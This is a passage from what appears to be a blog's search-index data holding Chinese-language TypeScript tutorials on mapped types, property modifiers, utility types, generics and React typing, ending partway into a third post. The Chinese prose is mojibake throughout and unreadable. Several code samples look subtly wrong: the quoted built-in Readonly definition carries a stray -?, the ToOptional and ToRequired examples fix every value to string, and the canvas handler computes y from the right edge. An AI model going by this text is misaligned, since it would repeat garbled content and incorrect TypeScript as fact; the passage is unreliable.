ä»¥ä¸Šé¢çš„ä¾‹å­ä¾†èªªï¼Œå…¶å¯¦åªæ˜¯å»è¿­ä»£ firstName å’Œ lastName é€™å…©å€‹å€¼ï¼Œä¸¦ç”¢ç”Ÿå‡ºåƒé€™æ¨£çš„æ±è¥¿ï¼š 1234type Person = { firstName: string lastName: string} é€™å€‹ä¾‹å­çœ‹èµ·ä¾†æœ‰é»è„«è¤²å­æ”¾å±çš„æ„Ÿè¦ºï¼Œä¸éå¦‚æœç”¨å°åœ°æ–¹çš„è©±æœƒç™¼ç¾é€™æ˜¯ä¸€å€‹å¾ˆå²å®³çš„åŠŸèƒ½ï¼Œè®“æˆ‘å€‘å†çœ‹ä¸€å€‹ä¾‹å­ã€‚ å‡è¨­ç›®å‰æœ‰å€‹ type é•·é€™æ¨£ï¼š 123456type Events = { click: string change: string keyup: string keydown: string} å¦‚æœæˆ‘æƒ³è¦å†å¤šä¸€å€‹ä¸€æ¨£çš„å‹åˆ¥ï¼Œåªæ˜¯ string çš„éƒ¨åˆ†æ”¹æˆ functionï¼Œåƒé€™æ¨£ï¼š 123456type EventHandlers = { click: () =&gt; void change: () =&gt; void keyup: () =&gt; void keydown: () =&gt; void} ä½ å¯ä»¥æƒ³æƒ³çœ‹æ€éº¼åˆ©ç”¨ Mapped Type ä¾†æ”¹å¯«å—ï¼Ÿä¸ç„¶é€™æ¨£å­å¯«æœƒæœ‰ä¸€å€‹å•é¡Œï¼Œå°±æ˜¯ç•¶ A æ”¹è®Šæ™‚ä¹Ÿå¾—ä¸€ä½µä¿®æ”¹ Bï¼Œæ‰èƒ½ç¢ºä¿å…©é‚Šçš„å…§å®¹æ˜¯ä¸€è‡´çš„ã€‚ ç­”æ¡ˆæ˜¯ï¼š 123type HandleEvents = { [K in keyof Events]: () =&gt; void} ç”¢å‡ºçš„å…§å®¹ï¼š å¾ˆç¥å¥‡å§ï¼ä½†å…¶å¯¦åªæ˜¯åˆ©ç”¨å‰é¢æéçš„æ¦‚å¿µè€Œå·²ï¼Œå…ˆç”¨ keyof æŠŠ Events çš„å±¬æ€§å–å‡ºä¾†ï¼Œå†åˆ©ç”¨ Mapped Type ä¾†è¿­ä»£å‡ºæ–°çš„å‹åˆ¥ã€‚ æ­é… Template Literal ä¿®æ”¹ key çš„å€¼å‰›å‰›å·²ç¶“ä»‹ç´¹éæ€éº¼åˆ©ç”¨ Mapped Type ä¾†ä¿®æ”¹ç‰©ä»¶å‹åˆ¥çš„å€¼çš„ typeï¼Œé€™é‚Šå†æ•™ä½ ä¸€æ‹›æ–°çš„ï¼šã€Œå¦‚ä½•ä¿®æ”¹ key çš„å€¼ã€ã€‚ é€™é‚Šæœƒæ‹¿å‰›å‰›çš„ç¯„ä¾‹ä¾†ç”¨ï¼š 123456type HandleEvents = { click: () =&gt; void change: () =&gt; void keyup: () =&gt; void keydown: () =&gt; void} é€™é‚Šæƒ³åšçš„äº‹æƒ…æ˜¯ï¼ŒæŠŠ key çš„éƒ¨åˆ†æ”¹æˆï¼š 123456type EventHandlers = { handlerClick: () =&gt; void handlerChange: () =&gt; void handlerKeyup: () =&gt; void handlerKeydown: () =&gt; void} å¦‚æœè¦é”æˆé€™æ¨£çš„æ•ˆæœï¼Œå¯ä»¥å»ºç«‹ä¸€å€‹ utility type ä¾†é”æˆï¼š é¦–å…ˆä¾†çœ‹ K in key of T &amp; string é€™ä¸€æ®µã€‚å› ç‚ºæˆ‘å€‘è¦å°å‚³å…¥çš„å‹åˆ¥ï¼ˆå³ Tï¼‰çš„ key åšä¿®æ”¹ï¼Œæ‰€ä»¥å¿…é ˆå…ˆæŠŠåŸæœ¬çš„ key é€é keyof å–å‡ºã€‚ å¦å¤– T &amp; string å¾Œé¢ &amp; string çš„ç”¨é€”åœ¨å‰é¢æœ‰æéï¼Œä¸€å€‹ key çš„å‹åˆ¥å¯ä»¥æ˜¯ string | number | symbolï¼Œæ‰€ä»¥è¦ç”¨ &amp; string ä¾†è®“ TS çŸ¥é“é€™é‚Šçš„ key æ˜¯ stringï¼Œå¦å‰‡å¾Œé¢åœ¨ä½¿ç”¨æ™‚æœƒæœ‰ä¸€äº›è¡çªã€‚ é †åˆ©å–å‡º key ä»¥å¾Œå°±å¯ä»¥æ­é… in ä¾†è¿­ä»£æ¯ä¸€å€‹ keyã€‚ æ¥è‘—çœ‹åˆ° as ... çš„éƒ¨åˆ†ã€‚as çš„ä½œç”¨æ˜¯ã€Œæ–·è¨€ã€ï¼Œä¾‹å¦‚èªªï¼š 1const something = '123' as number é€™è£¡çš„ '123' ç…§ç†èªªæœƒæ˜¯ stringï¼Œä½†æ˜¯ç•¶æˆ‘å€‘åœ¨å¾Œé¢åŠ ä¸Š as number ä»¥å¾Œï¼Œsomething å°±æœƒè¢«å¼·åˆ¶è®Šæˆ number çš„å‹åˆ¥ï¼š æˆ‘çŸ¥é“é€™å€‹ä¾‹å­çœ‹èµ·ä¾†æœ‰é»è©­ç•°ï¼Œä½†é‡é»æ˜¯è¦å¼·èª¿ as å¯ä»¥æŠŠåŸæœ¬çš„å‹åˆ¥ä¿®æ”¹æˆå¦ä¸€å€‹å‹åˆ¥ã€‚ æ‰€ä»¥ K in key of T &amp; string å¾Œé¢çš„ as å°±æ˜¯åœ¨ã€ŒæŠŠå‰é¢çš„ K ä¿®æ”¹æˆ ??? å‹åˆ¥ã€ã€‚é€™è£¡æƒ³åšçš„ä¿®æ”¹æ˜¯æŠŠåŸæœ¬çš„ K åŠ ä¸Šå‰ç¶´å­— handlerï¼Œæ‰€ä»¥æ­é…äº† Template Literal ä¾†åšè™•ç†ï¼ˆå³ handler${Capitalize&lt;K&gt;}ï¼‰ï¼Œé€éé€™ç¨®æ–¹å¼ç”¢å‡ºçš„å‹åˆ¥å°±æœƒæ˜¯ handler(xxx)ï¼ˆxxx å°±æ˜¯ K åŸæœ¬çš„å­—ä¸²å…§å®¹ï¼‰ã€‚ é™¤äº†åŠ ä¸Š handler å‰ç¶´ä»¥å¤–ï¼Œé€™é‚Šé‚„ç”¨äº† Capitalize æŠŠ K çš„å­—é¦–è®Šæˆå¤§å¯«ï¼Œè—‰æ­¤è®“ç”¢å‡ºçš„æ–‡å­—ç¬¦åˆ JS çš„å‘½åæ…£ä¾‹ï¼ˆé§å³°å¼ï¼‰ã€‚ ç†è§£å®Œæ¯ä¸€æ­¥çš„é‚è¼¯å¾Œï¼Œç¾åœ¨å¯ä»¥åˆ©ç”¨å®ƒä¾†é”åˆ°æˆ‘å€‘æƒ³è¦çš„çµæœäº†ï¼š 1234type ToEventHandler&lt;T&gt; = { [K in keyof T &amp; string as `handler${Capitalize&lt;K&gt;}`]: T[K]}type EventHandler = ToEventHandler&lt;HandleEvents&gt; Property modifiersé›–ç„¶ä½ å¯èƒ½ä¸çŸ¥é“ä»€éº¼æ˜¯ã€ŒProperty modifiersã€ï¼Œä½†ä½ å…¶å¯¦æ—©å°±åœ¨ç”¨å®ƒäº†ï¼š 12345type Person = { firstName: string readonly lastName: string age?: number} ? è·Ÿ readonly é€™å…©å€‹ç¬¦è™Ÿéƒ½æ˜¯ Property modifiersã€‚å¦‚å…¶åï¼Œå°±æ˜¯ property çš„ä¿®é£¾ç¬¦è™Ÿã€‚ä»¥é€™å€‹ä¾‹å­ä¾†èªªçš„è©±ï¼š age å±¬æ€§æ˜¯ optional çš„ï¼Œæ²’æœ‰ä¹Ÿæ²’é—œä¿‚ lastName çš„å±¬æ€§å€¼åªèƒ½è®€ï¼Œä¸å¯ä»¥æ”¹å¯«å®ƒçš„å€¼ æ­é… Mapped Type ä¾†ä½¿ç”¨å¦‚æœç¾åœ¨æˆ‘å€‘æœ‰å…©å€‹ Type æ˜¯ï¼š 1234567891011type OptionalPerson = { firstName?: string lastName?: string age?: number}type NonOptionalPerson = { firstName: string lastName: string age: number} ç¾åœ¨å¦‚æœè¦è®“ OptionalPerson çš„æ‰€æœ‰å±¬æ€§è®Šæˆ Optionalï¼Œå¯ä»¥é€™æ¨£å¯«ï¼š 1234type ToOptional&lt;T&gt; = { // ? å‰é¢çš„ + å¯ä»¥çœç•¥ï¼ˆé è¨­å€¼ï¼‰ [K in keyof T]+?: string} æˆ–è€…æ˜¯æŠŠ NonOptionalPerson çš„æ‰€æœ‰å±¬æ€§è®Šæˆ Required çš„è©±ï¼š 1234type ToRequired&lt;T&gt; = { // - ä¸å¯ä»¥çœç•¥ [K in keyof T]-?: string} åˆæˆ–è€…æ˜¯è¨­ç‚º readonly æˆ– non-readonly çš„è©±ä¹Ÿå¯ä»¥é€™æ¨£åšï¼š 123456type ToNonReadOnly&lt;T&gt; = { -readonly [K in keyof T]: string}type ToReadOnly&lt;T&gt; = { +readonly [K in keyof T]: string} æœ€å¾Œä¾†åšå€‹æ¸¬è©¦ã€‚ å¦‚æœç¾åœ¨æŠŠ OptionalPerson ä¸Ÿçµ¦ ToRequiredï¼Œæ‰€æœ‰å±¬æ€§å°±æœƒè®Šæˆ Requiredï¼š Partialã€Required å’Œ Readonlyå‰›å‰›åˆ©ç”¨ property modifier å»ºç«‹çš„ä¸‰ç¨® Typeï¼Œå…¶å¯¦å°±æ˜¯ TS å…§å»ºæä¾›çš„ Partialã€Required å’Œ Readonlyã€‚é€™é‚Šåˆ†åˆ¥ä¾†çœ‹ä¸€ä¸‹å®ƒå€‘åŸå§‹ç¢¼ï¼š 123type Partial&lt;T&gt; = { [P in keyof T]?: T[P]} 123type Required&lt;T&gt; = { [P in keyof T]-?: T[P]} 123type Readonly&lt;T&gt; = { readonly [P in keyof T]-?: T[P]} æ³›å‹åƒæ•¸é è¨­å€¼ å¦‚æœä½ æœ‰ç”¨é JS ä¸­çš„åƒæ•¸é è¨­å€¼çš„è©±ï¼Œè¦ç†è§£ TS ä¸­çš„æ³›å‹åƒæ•¸é è¨­å€¼æ‡‰è©²å°±ä¸å›°é›£ã€‚ æˆ‘å€‘ä¸€èˆ¬åœ¨ JS ä¸­ä½¿ç”¨åƒæ•¸é è¨­å€¼çš„æ™‚å€™é€šå¸¸æ˜¯é€™æ¨£ï¼š 123456// å¦‚æœ arr æ²’æœ‰å‚³ï¼Œå°‡é è¨­å€¼è¨­ç‚ºç©ºé™£åˆ—function getLength(arr = []) { return arr.length}getLength() // 0 è¦åœ¨ TS ä¸­åšä¸€æ¨£çš„äº‹æƒ…ä¹Ÿæ˜¯ OK çš„ï¼Œè®“æˆ‘å€‘å›åˆ°ä¸€é–‹å§‹çš„ä¾‹å­ï¼š 1type PickWithDefaultValue&lt;T, K extends keyof T = keyof T&gt; = Pick&lt;T, K&gt; é€™è£¡çš„ PickWithDefaultValue è·ŸåŸæœ¬çš„ Pick åŠŸèƒ½æ˜¯ä¸€æ¨£çš„ï¼Œæœƒæ¥æ”¶å…©å€‹åƒæ•¸ï¼Œç¬¬ä¸€å€‹åƒæ•¸æ˜¯åŸæœ¬çš„ç‰©ä»¶å‹åˆ¥ï¼Œç¬¬äºŒå€‹åƒæ•¸æ˜¯è¦å–å‡ºçš„å±¬æ€§ã€‚ å…©å€‹çš„å·®åˆ¥åªåœ¨æ–¼ç¬¬äºŒå€‹åƒæ•¸æ˜¯ä¸æ˜¯ä¸€å®šè¦å‚³å…¥ï¼Ÿä»¥åŸæœ¬ Pick ä¾†èªªï¼Œå¦‚æœä½ æ²’æœ‰å‚³å…¥ç¬¬äºŒå€‹åƒæ•¸çš„è©±æœƒ TS æœƒå ±éŒ¯ï¼š ä½†å¦‚æœæ˜¯ç”¨ PickWithDefaultValue çš„è©±ï¼Œå› ç‚ºæœ‰é è¨­å€¼çš„é—œä¿‚ï¼Œæ‰€ä»¥å°±ç®—ä¸å‚³å…¥ç¬¬äºŒå€‹åƒæ•¸ä¹Ÿæ²’é—œä¿‚ï¼š é€™æ˜¯æ€éº¼åšåˆ°çš„ï¼Ÿåªæ˜¯å› ç‚ºæˆ‘å€‘å¹«ä»–åŠ ä¸Šäº†é è¨­å€¼è€Œå·²ï¼š 12// å¦‚æœ K æ²’æœ‰å€¼ï¼Œå°±è¨­ç‚º T çš„æ‰€æœ‰ keytype PickWithDefaultValue&lt;T, K extends keyof T = keyof T&gt; = Pick&lt;T, K&gt; åƒè€ƒè³‡æ–™React å‰ç«¯å·¥ç¨‹å¸«çš„å…©æŠŠåˆ·å­","link":"/2023/01/01/typescript-advanced/"},{"title":"TypeScript åŸºç¤","text":"çœŸçš„é —åŸºç¤çš„ QQ å‰å‚™çŸ¥è­˜ TS åªæ˜¯ä¸€å€‹å·¥å…·ï¼Œç”¨ä¾†è®“ JS å¯ä»¥æœ‰å¼·å‹åˆ¥çš„é©—è­‰ æˆ‘å€‘åªæ˜¯å…ˆç”¨ TS çš„æ–¹å¼ä¾†å¯«ï¼Œæ¥è‘—å†ç·¨è­¯å™¨ä¾† Complie æˆ JS ç›¸é—œæŒ‡ä»¤ tsc index.js ç·¨è­¯æŸå€‹æª”æ¡ˆ tsc æ ¹æ“š config ä¾†åšç·¨è­¯ tsc --watch æœ‰è®Šå‹•å°±é‡æ–°ç·¨è­¯ æœ€åŸºæœ¬ç¯„ä¾‹123// index.tslet aaa: string = '123'console.log(aaa) ç·¨è­¯å¾Œï¼š 12var aaa = '123'console.log(aaa) å¦å¤–æˆ‘ä¹Ÿæœ‰çœ‹éé€™ç¨®å¯«æ³•ï¼š 1let aaa = 123 as number; é€™æ¨£çš„æ„æ€æ‡‰è©²è·Ÿä¸Šé¢æ˜¯å·®ä¸å¤šçš„ï¼Œå°±çœ‹ä½ å–œæ­¡å“ªç¨®å§ï¼ è¨­å®š configå…ˆåœ¨å°ˆæ¡ˆåº•ä¸‹åŸ·è¡Œï¼š 1tsc --init å°ˆæ¡ˆå°±æœƒå¤šå‡ºä¸€å€‹ tsconfig.jsonï¼Œè£¡é¢å°±å¯ä»¥å»èª¿æ•´è¨­å®šï¼ˆè·Ÿ VS Code å·®ä¸å¤šï¼‰ é€™é‚Šä¾†è¨­å®šæœ€åŸºæœ¬çš„å…©å€‹æ±è¥¿ï¼š å…¥å£è³‡æ–™å¤¾ å‡ºå£è³‡æ–™å¤¾ 12345// tsconfig.json{ \"rootDir\": \"./src\", \"outDir\": \"./dist\"} æ¥è‘—åªè¦åŸ·è¡Œ tsc å°±æœƒè‡ªå‹•æ ¹æ“š config ä¾†åšç·¨è­¯äº†ã€‚ å¦å¤–è¦é–‹å•Ÿ source map çš„è©±å¯ä»¥æŠŠ sourceMap è¨­ç‚º trueã€‚ å‹åˆ¥ä»‹ç´¹åŸºæœ¬12345678910111213let str: string = '123'// é€šå¸¸é€™ç¨®æ²’å€¼çš„æ‰æœƒå»ºè­°å¯«ä¸Š typelet str1: stringstr1 = 'PeaNu'let num: number = 123let bool: boolean = truelet n: null = nulllet un: undefined = undefined// å¦‚åï¼Œå¯ä»¥æ˜¯ä»»ä½• type// ä½†ä¸€èˆ¬åªæœƒç”¨åœ¨å¿…è¦çš„åœ°æ–¹let anyType: any = 123 é™£åˆ—12345678910// æ±ºå®šé™£åˆ—ä¸­çš„å€¼çš„ typelet arr1: string[] = ['a', '123']// äºŒç¶­è£¡çš„ typelet arr2: string[][] = [['a'], ['b']]// å…ƒç¥–ï¼ˆTupleï¼‰// æŒ‰ç…§ã€Œé †åºã€æ±ºå®šæ¯ä¸€å€‹ typelet tuple1: [number, string, boolean] = [123, 'abc', true]// äºŒç¶­å…ƒç¥–è£¡çš„ typelet tuple2: [string, string][] = [['abc', 'def']] Enumæœ‰é»åƒä»£è™Ÿçš„æ„Ÿè¦ºï¼Œä½†æ”¹ç”¨æ–‡å­—ä¾†è¡¨ç¤ºï¼š 1234567enum LiveStatue { SUCCESS = 0, FAIL = -1, STREAMING = 1}const liveStatus = LiveStatue.SUCCESS Unionä¸€å€‹è®Šæ•¸å¯ä»¥è¨­å®šå¤šå€‹ typeï¼š 1234// å¯ä»¥æ˜¯ number æˆ– stringlet union: number | stringunion = 123union = 'abc' typeæŠŠ union æ”¹ç”¨ type ä¾†å„²å­˜ï¼ˆè·Ÿè®Šæ•¸æœ‰é»åƒï¼‰ 1234567891011121314151617181920type A = number | stringtype B = boolean | stringlet useTypeA: AuseTypeA = 123useTypeA = 'abc'let useTypeB: BuseTypeB = trueuseTypeB = 'yoyoyo'type Card = { name: string des: string}const user: Card = { name: 'PeaNu', des: '...'} interfaceæ‡‰è©²æ˜¯ç”¨åœ¨ Objectï¼š 1234567891011interface Card2 { name: string des: string age: number}const user: Card2 = { name: 'PeaNu', des: '...', age: 20} ä¹Ÿå¯ä»¥ç”¨ ? ä¾†è®Šæˆã€Œå¯é¸ã€çš„ï¼š 1234567891011interface Card2 { name: string; des: string; age?: number;}// æ²’æœ‰ age ä¹Ÿæ²’é—œä¿‚const user: Card2 = { name: 'PeaNu', des: '...'} type è·Ÿ interface çš„å€åˆ¥ä¸€å€‹å¯ä»¥ã€Œæ“´å……ã€ï¼Œä¸€å€‹ä¸è¡Œã€‚ 1234567891011121314151617type Card1 = { name: string des: string}// type ä¸å¯ä»¥åœ¨å¾€ä¸‹åŠ type Card1 = { age: number}interface Card2 { name: string des: string}// interface å¯ä»¥interface Card2 { age?: number} Functionfunction ä¸»è¦æ˜¯ç”¨ä¾†è™•ç†åƒæ•¸å’Œå›å‚³å€¼çš„éƒ¨åˆ†ï¼š 12345678910// å›å‚³å€¼çš„ typefunction stringConcat(a: string, b: string): string { return a + b}// undefined çš„è™•ç†ï¼ˆåŠ ä¸Šå•è™Ÿï¼‰// undefined çš„é¡å‹åªèƒ½å¯«åœ¨æœ€å¾Œé¢ï¼Œç•¢ç«Ÿåƒæ•¸è¦æŒ‰ç…§é †åºå‚³function saySomething(age: string, name?: string) { return age + name} æ–·è¨€ï¼ˆunknownï¼‰ç¬¬ä¸€å€‹æœƒç”¨åˆ°çš„æƒ…å¢ƒæ˜¯ call API çš„æ™‚å€™ã€‚ å› ç‚º TypeScript æ²’è¾¦æ³•çŸ¥é“ response é•·æ€æ¨£ï¼Œæ‰€ä»¥ä»€éº¼éƒ½æ²’åŠ çš„è©±å°±æœƒæ˜¯ anyã€‚ 12345678910111213type Data = { userId: number id: number title: string completed: boolean}async function getData() { const res = await fetch('https://jsonplaceholder.typicode.com/todos/1') // å¦‚æœæ²’æœ‰ as Dataï¼Œå°±æœƒè¢«ç•¶ä½œ any const data = (await res.json()) as Data console.log(data)} æ‰€ä»¥ä¸Šé¢çš„ä¾‹å­å°±é€é as Data ä¾†åšæ–·è¨€ï¼Œå‘Šè¨´å®ƒå›å‚³å€¼æœƒé•·å¾—åƒ Data é€™å€‹æ¨¡æ¨£ã€‚ ç¬¬äºŒç¨®ç”¨æ³•æ˜¯å¯èƒ½æŸå€‹å€¼è¢« TypeScript è‡ªå‹•åˆ¤æ–·ï¼Œä½†é€™çµæœå¯èƒ½ä¸å¤ªæº–ç¢ºï¼Œå°±èƒ½ç”¨ as unknown as xxx çš„æ‰‹æ³•ä¾†åšï¼š 1234567891011121314151617181920212223242526type Data = { userId: number id: number title: string completed: boolean}// as unknown å¾Œå†é‡æ–°æ–·è¨€// å…ˆæŠŠ data1 è¨­ç‚º Data é€™å€‹ type// æ¥è‘—æŠŠå€¼è³¦äºˆçµ¦ data2ï¼Œå®ƒå°±æœƒè‡ªå‹•è¢«åˆ¤å®šç‚º Data é€™å€‹ type// ä½†å¦‚æœ data1 çš„å€¼ä¸å›ºå®šçš„è©±å°±æœƒæœ‰ä¸€äº›èª¤å·®å•é¡Œconst data1: Data = { userId: 1, id: 1, title: 'delectus aut autem', completed: false}// data2: Dataconst data2 = data1type Data2 = { name: string}// data2: Data2const data2 = data1 as unknown as Data2 Class çš„æ‡‰ç”¨ä¸€èˆ¬åœ¨ class è£¡å¯ä»¥å®£å‘Š privateã€publiceã€protected ç­‰ç­‰ä¹‹é¡çš„é—œéµå­—ï¼Œbut æˆ‘å€‘éƒ½çŸ¥é“ JS æœ¬èº«ä¸¦æ²’æœ‰å¯¦éš›æ”¯æ´é€™äº›åŠŸèƒ½ï¼Œä½ é‚„æ˜¯å¯ä»¥åœ¨å¤–é¢ç›´æ¥å»å­˜å– private çš„æˆå“¡ã€‚ è€Œ TS è§£æ±ºäº†é€™å€‹å•é¡Œï¼Œå¦‚æœä½ åœ¨ TS å»å­˜å–ç§æœ‰æˆå“¡ï¼Œå°±æœƒç·¨è­¯å¤±æ•—ã€‚ æé†’ï¼šprivate è·Ÿ protected çš„å·®åˆ¥åœ¨æ–¼ï¼Œé€éç¹¼æ‰¿çš„ class æ²’è¾¦æ³•å­˜å–åˆ° privateï¼Œä½† protected å¯ä»¥ã€‚ 12345678910111213class Live { public name: string private id: number protected user: string constructor(nameParam: string, idParam: number, userParam: string) { this.name = nameParam this.id = idParam this.user = userParam }}const live = new Live(\"PeaNu's live\", 12345, 'PeaNu')console.log(live) é€™æ¨£çš„çµæœæœƒæ˜¯ï¼š 123456// é‚„æ˜¯å­˜å–çš„åˆ° private è·Ÿ protected{ \"name\": \"PeaNu's live\", \"id\": 12345, \"user\": \"PeaNu\"} ä½†å¦‚æœä½ åœ¨ TS é€™æ¨£å¯«çš„è©±å°±æœƒéŒ¯èª¤ï¼š è‡³æ–¼ protected çš„éƒ¨åˆ†ä¹Ÿä¸€æ¨£ï¼ŒTS ä¸€æ¨£æœƒå»åˆ¤æ–·ç¹¼æ‰¿çš„ class å¯ä»¥å­˜å–åˆ°å“ªäº›æˆå“¡ï¼š 12345678910class SpecailLive extends Live { constructor(nameParam: string, idParam: number, userParam: string) { super(nameParam, idParam, userParam) } start() { super.name super.user super.id // ä¸å¯ä»¥å­˜å–åˆ° private çš„å€¼ }} å¦‚æœä¸ä¾è³´ TS çš„è©±ï¼ŒJS åŸç”Ÿçš„ä½œæ³•æ˜¯é€™æ¨£ï¼š 123456789101112// åŸç”Ÿçš„ private æ–¹æ³•ï¼ˆæ¯”è¼ƒæ–°ï¼‰class Live2 { #name constructor(name: string) { this.#name = name }}// èƒŒå¾Œæ˜¯ç”¨ weakMap å»å¯¦ä½œçš„const testLive = new Live2('Test Live')// {}console.log(testLive) implementclass å¦‚æœæƒ³æŠŠæŸå€‹ interface å¯¦ä½œå‡ºä¾†ï¼Œå¯ä»¥ç”¨ implement é€™å€‹é—œéµå­—ï¼Œåƒé€™æ¨£ï¼š 12345678910111213interface CarProps { name: string age: number}class Car implements CarProps { name: string age: number constructor(name: string, age: number) { this.name = name this.age = age }} ä¸éè¦æ³¨æ„ï¼Œinterface ä¸­çš„æˆå“¡ä¸€å®šæ˜¯ publicï¼Œä¸å¯ä»¥åœ¨ class ä¸­å¯«æˆ privateï¼š æ³›å‹ç°¡å–®ä¾†èªªå°±æ˜¯ã€Œcall function çš„æ™‚å€™æ‰æ±ºå®š type æ˜¯ä»€éº¼ã€ï¼Œç›´æ¥çœ‹ç¯„ä¾‹ï¼š 1234567// å¦‚æœè¦å¤šå€‹çš„è©±å¯ä»¥å¯«æˆ print&lt;A, B, C&gt;function print&lt;T&gt;(data: T) { console.log(data)}print&lt;number&gt;(999)print&lt;string&gt;('Hello')print&lt;boolean&gt;(123) // éŒ¯èª¤ï¼Œæ²’æœ‰å‚³æ­£ç¢ºçš„ type å¦å¤–ä¹Ÿèƒ½ç”¨åœ¨ class ä¸Šï¼ˆconstructorï¼‰ï¼š 123456789class Print&lt;T&gt; { data: T constructor(d: T) { this.data = d }}const p = new Print&lt;number&gt;(123)const p1 = new Print&lt;string&gt;('Hello') &amp; èˆ‡ |å…¶å¯¦ä»–å€‘å°±è·Ÿ &amp;&amp; å’Œ || çš„æ„æ€æ˜¯ã„§æ¨£çš„ï¼ˆæ‡‰è©²æ˜¯ç‚ºäº†æ–¹ä¾¿å€åˆ†å§ï¼ï¼‰ï¼Œç›´æ¥ä¾†çœ‹ code å°±æ˜ç™½äº†ï¼š 12345678910111213141516171819interface OP1 { a: number}interface OP2 { b: number}// æŒ‡å®š type ç‚º OP1 ä¸” OP2// åªè¦æ¼æ‰ä¸€å€‹å°±ä¸æ­£ç¢ºconst op1AndOp2: OP1 &amp; OP2 = { a: 123, b: 456}// æŒ‡å®š type ç‚º OP1 æˆ– OP2// å¯ä»¥æ“‡ä¸€å°±å¥½const op1OrOp2: OP1 | OP2 = { a: 123} TS å…§éƒ¨æä¾›çš„ utilityRecordç¬¬ä¸€å€‹æ˜¯ Recordï¼Œå…¶ä¸­ä¸€å€‹ä¾‹å­æ˜¯æ±ºå®š Object çš„ key è·Ÿ valueï¼š 1234567891011121314151617// æ±ºå®šç‰©ä»¶çš„ valueinterface CatInfo { age: number breed: string}// æ±ºå®šç‰©ä»¶çš„ keytype CatName = 'miffy' | 'boris' | 'mordred'// ä¸€å€‹ç‰©ä»¶åŒ…ç‰©ä»¶çš„çµæ§‹const cats: Record&lt;CatName, CatInfo&gt; = { miffy: { age: 10, breed: 'Persian' }, boris: { age: 5, breed: 'Maine Coon' }, mordred: { age: 16, breed: 'British Shorthair' }, // ä¸å­˜åœ¨çš„ key æœƒå ±éŒ¯ peanu: { age: 22, breed: '...' }} Pickç¬¬äºŒå€‹æ˜¯ Pickï¼Œå¯ä»¥å¾ interface æŠ½ä¸€éƒ¨åˆ†çš„å…§å®¹ä¾†ç”¨ï¼š 1234567891011121314interface Todo { title: string description: string completed: boolean}type TodoPreview = Pick&lt;Todo, 'title' | 'completed'&gt;const todo: TodoPreview = { title: 'Clean room', completed: false, // æ²’æœ‰ pick å‡ºä¾†çš„æ±è¥¿å°±ä¸èƒ½ç”¨ description: 'yoyoyo'} Omitç¬¬ä¸‰å€‹æ˜¯ Omitï¼Œå°±æ˜¯ Pick é¡›å€’éä¾†è€Œå·²ï¼ŒPick æ˜¯æŠŠè¦çš„æ‹¿å‡ºä¾†ï¼ŒOmit æ˜¯æŠŠä¸è¦çš„æ±è¥¿æ‹¿æ‰ï¼Œå…¶ä»–ç•™ä¸‹ã€‚ 12345678910111213141516interface Todo { title: string description: string completed: boolean createdAt: number}type TodoPreview = Omit&lt;Todo, 'description'&gt;const todo: TodoPreview = { title: 'Clean room', completed: false, createdAt: 20210511, // å·²ç¶“ Omit æ‰çš„æ±è¥¿å°±ä¸è©²å‡ºç¾ description: '...'} Partialæœ‰æ™‚å€™ä½ å¯èƒ½å®šç¾©äº†é€™æ¨£çš„å‹åˆ¥ï¼š 123456789interface Blog { id: string title: string slug: string categories: string[] tags: string[] featureImageUrl?: string content: string} ä½†ä½ æ²’è¾¦æ³•ç¢ºä¿æ¯ä¸€æ¬¡ä½¿ç”¨æ™‚éƒ½èƒ½å¡«å…¥æ¯ä¸€å€‹å€¼ï¼Œé€™æ™‚å€™å°±å¯ä»¥ç”¨ Partial&lt;T&gt; çš„æ–¹å¼æŠŠæ‰€æœ‰é¸é …è®Šæˆã€ŒOptionalã€ï¼Œé¿å… TypeScript çš„ç·¨è­¯éŒ¯èª¤ï¼š 123const post: Partial&lt;Blog&gt; = { title: 'Partial so good'} ä½ ä¸¦æ²’æœ‰ç›´æ¥æ”¹è®Š Blog çš„å‹åˆ¥ï¼Œè€Œæ˜¯åœ¨ã€Œä½¿ç”¨æ™‚ã€ä¾†è®“ä»–è®Šæˆå¯é¸çš„ï¼Œæˆ‘è¦ºå¾—é€™æ˜¯å¾ˆåˆ’ç®—çš„åŠŸèƒ½ã€‚ ReactåŸºæœ¬ç¯„ä¾‹é€™é‚Šä¸»è¦ä»‹ç´¹å¹¾å€‹æ±è¥¿ï¼š Functional Component çš„ type Props çš„ type hook çš„ type 12345678910111213141516171819202122import React, { useState } from 'react'import './App.css'// æˆ‘å¸Œæœ›å‚³é€²ä¾†çš„ props çš„ typestype TitleProps = { name: string | number desc?: string}// åªè¦æ˜¯ Function Component åŸºæœ¬ä¸Šéƒ½æœƒé€™æ¨£å¯«ï¼ˆReact.FCï¼‰const Title: React.FC&lt;TitleProps&gt; = ({ name, desc }) =&gt; { return &lt;h1&gt;Hello, {name}&lt;/h1&gt;}const App: React.FC = () =&gt; { // ç•¶æˆ‘ useState å¯èƒ½æœ‰å¤šå€‹å€¼çš„æ™‚å€™æ‰æœƒå¯«å‡ºä¾† const [title, setTitle] = useState&lt;string | number&gt;('PeaNu') return &lt;Title name={title} /&gt;}export default App Eventå¦‚æœè¦æŒ‡å®š Event çš„ typeï¼Œå¯ä»¥åŠ ä¸Š React å‰ç¶´ä¾†è™•ç†ï¼š 1234567891011121314151617181920212223242526272829303132333435function App() { const canvas1 = useRef&lt;HTMLCanvasElement&gt;(null) // åŸæœ¬æ˜¯ç›´æ¥ TouchEvent | MouseEventï¼Œä½†åœ¨ React è¦åŠ ä¸Šå‰ç¶´ function onStart(event: React.TouchEvent | React.MouseEvent) { const cavasSize = canvas1.current?.getBoundingClientRect()! let position = { x: 0, y: 0 } if (event.type === 'mousemove') { position.x = (event as React.MouseEvent).clientX - cavasSize.left position.y = (event as React.MouseEvent).clientY - cavasSize.right } else { position.x = (event as React.TouchEvent).changedTouches[0].clientX - cavasSize.left position.y = (event as React.TouchEvent).changedTouches[0].clientY - cavasSize.right } return position } return ( &lt;div className='App'&gt; &lt;canvas ref={canvas1} id='canvas' width='500' height='300' onMouseDown={onStart} onTouchStart={onStart} &gt;&lt;/canvas&gt; &lt;/div&gt; )}","link":"/2022/05/10/typescript-basic/"},{"title":"TypeScriptï¼è¤‡ç¿’èˆ‡ä¸€äº›å°æŠ€å·§","text":"çœ‹ä¾†è¦ç²¾é€šå®ƒå¾—èŠ±æ›´å¤šæ™‚é–“ä¾†ç·´ç¿’æ‰è¡Œã€‚ å­˜å– DOM å…ƒç´ ç•¶æˆ‘å€‘åœ¨æ“ä½œ DOM å…ƒç´ æ™‚ï¼Œå¯èƒ½æœƒç”¨ä¸€å€‹è®Šæ•¸ä¾†å„²å­˜å…ƒç´ 